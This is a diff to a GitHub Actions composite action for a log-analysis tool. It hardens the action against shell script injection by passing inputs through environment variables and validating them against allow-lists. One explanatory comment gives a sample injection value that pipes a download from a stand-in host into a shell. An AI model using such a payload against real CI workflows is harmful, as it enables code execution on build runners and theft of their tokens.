@@ -64,6 +64,44 @@ outputs:
 runs:
   using: "composite"
   steps:
+    # Security: inputs are passed to shell steps ONLY through `env:` and always
+    # quoted. Never write ${{ inputs.* }} (or other expressions a workflow can
+    # feed with untrusted data) directly inside a `run:` script — the runner
+    # pastes it into the script source before bash runs, so a value such as
+    # x"; curl evil | sh; echo " would execute.
+    - name: Validate inputs
+      shell: bash
+      env:
+        INPUT_SOURCE: ${{ inputs.source }}
+        INPUT_MODE: ${{ inputs.mode }}
+        INPUT_FAIL_ON: ${{ inputs.fail-on }}
+        INPUT_MIN_SCORE: ${{ inputs.min-score }}
+        INPUT_LIMIT: ${{ inputs.limit }}
+        INPUT_VERSION: ${{ inputs.version }}
+      run: |
+        # Messages name the bad input but never echo its value: printing an
+        # untrusted value could itself inject a workflow command.
+        fail() { echo "::error title=LogLens AI::$1"; exit 1; }
+        [ -n "$INPUT_SOURCE" ] || fail "Input 'source' is required."
+        mode=$(printf '%s' "$INPUT_MODE" | tr '[:upper:]' '[:lower:]')
+        case "$mode" in
+          fast|turbo|deep) ;;
+          *) fail "Invalid 'mode' input. Use one of: fast, turbo, deep." ;;
+        esac
+        fail_on=$(printf '%s' "$INPUT_FAIL_ON" | tr '[:upper:]' '[:lower:]')
+        case "$fail_on" in
+          ""|none|emergency|alert|fatal|critical|error|warning|warn|any) ;;
+          *) fail "Invalid 'fail-on' input. Use one of: critical, error, warning, fatal, emergency, alert, any (or leave empty)." ;;
+        esac
+        score_re='^(0|1|0?\.[0-9]+|1\.0+)$'
+        [[ "$INPUT_MIN_SCORE" =~ $score_re ]] || fail "Invalid 'min-score' input. Use a number from 0 to 1, e.g. 0.7."
+        limit_re='^[0-9]{1,6}$'
+        [[ "$INPUT_LIMIT" =~ $limit_re ]] || fail "Invalid 'limit' input. Use a whole number, e.g. 25."
+        if [ -n "$INPUT_VERSION" ]; then
+          version_re='^[0-9]+(\.[0-9]+)*([a-zA-Z0-9.+-]*)$'
+          [[ "$INPUT_VERSION" =~ $version_re ]] || fail "Invalid 'version' input. Use a release number, e.g. 0.13.1."
+        fi
+
     - name: Set up Python
       uses: actions/setup-python@v5
       with:
@@ -71,10 +109,12 @@ runs:
 
     - name: Install LogLens AI
       shell: bash
+      env:
+        INPUT_VERSION: ${{ inputs.version }}
       run: |
         python -m pip install --upgrade pip
-        if [ -n "${{ inputs.version }}" ]; then
-          pip install "loglensai==${{ inputs.version }}"
+        if [ -n "$INPUT_VERSION" ]; then
+          pip install "loglensai==${INPUT_VERSION}"
         else
           pip install loglensai
         fi
@@ -82,18 +122,29 @@ runs:
     - name: Analyze logs
       id: loglens
       shell: bash
+      env:
+        ACTION_PATH: ${{ github.action_path }}
+        INPUT_SOURCE: ${{ inputs.source }}
+        INPUT_MODE: ${{ inputs.mode }}
+        INPUT_FAIL_ON: ${{ inputs.fail-on }}
+        INPUT_MIN_SCORE: ${{ inputs.min-score }}
+        INPUT_LIMIT: ${{ inputs.limit }}
+        INPUT_SARIF: ${{ inputs.sarif }}
+        INPUT_COMMENT_ON_PR: ${{ inputs.comment-on-pr }}
+        INPUT_UPLOAD_REPORT: ${{ inputs.upload-report }}
       run: |
         set +e
+        mode=$(printf '%s' "$INPUT_MODE" | tr '[:upper:]' '[:lower:]')
         extra=()
-        [ "${{ inputs.sarif }}" = "true" ] && extra+=(--sarif loglens.sarif)
-        [ "${{ inputs.comment-on-pr }}" = "true" ] && extra+=(--comment-file loglens-comment.md)
-        [ "${{ inputs.upload-report }}" = "true" ] && extra+=(--report-json loglens-report.json)
-        python "${{ github.action_path }}/ci/gh_analyze.py" \
-          --source "${{ inputs.source }}" \
-          --mode "${{ inputs.mode }}" \
-          --fail-on "${{ inputs.fail-on }}" \
-          --min-score "${{ inputs.min-score }}" \
-          --limit "${{ inputs.limit }}" \
+        [ "$INPUT_SARIF" = "true" ] && extra+=(--sarif loglens.sarif)
+        [ "$INPUT_COMMENT_ON_PR" = "true" ] && extra+=(--comment-file loglens-comment.md)
+        [ "$INPUT_UPLOAD_REPORT" = "true" ] && extra+=(--report-json loglens-report.json)
+        python "$ACTION_PATH/ci/gh_analyze.py" \
+          --source "$INPUT_SOURCE" \
+          --mode "$mode" \
+          --fail-on "$INPUT_FAIL_ON" \
+          --min-score "$INPUT_MIN_SCORE" \
+          --limit "$INPUT_LIMIT" \
           "${extra[@]}"
         echo "exit-code=$?" >> "$GITHUB_OUTPUT"
 
@@ -109,10 +160,12 @@ runs:
       shell: bash
       env:
         GH_TOKEN: ${{ github.token }}
+        PR_NUMBER: ${{ github.event.pull_request.number }}
+        REPO: ${{ github.repository }}
       run: |
         marker="<!-- loglens-ai-report -->"
-        pr="${{ github.event.pull_request.number }}"
-        repo="${{ github.repository }}"
+        pr="$PR_NUMBER"
+        repo="$REPO"
         existing=$(gh api "repos/$repo/issues/$pr/comments" \
           --jq "map(select(.body | startswith(\"$marker\"))) | .[0].id // empty" 2>/dev/null || true)
         if [ -n "$existing" ]; then
@@ -134,9 +187,13 @@ runs:
     - name: Enforce fail-on gate
       if: always()
       shell: bash
+      env:
+        EXIT_CODE: ${{ steps.loglens.outputs.exit-code }}
+        INPUT_FAIL_ON: ${{ inputs.fail-on }}
       run: |
-        code="${{ steps.loglens.outputs.exit-code }}"
+        code="$EXIT_CODE"
         if [ "${code:-0}" != "0" ]; then
-          echo "::error::LogLens failed the build (fail-on='${{ inputs.fail-on }}', exit $code)."
+          # fail-on is allow-listed by "Validate inputs" before analysis can run.
+          echo "::error::LogLens failed the build (fail-on='${INPUT_FAIL_ON}', exit $code)."
           exit 1
         fi
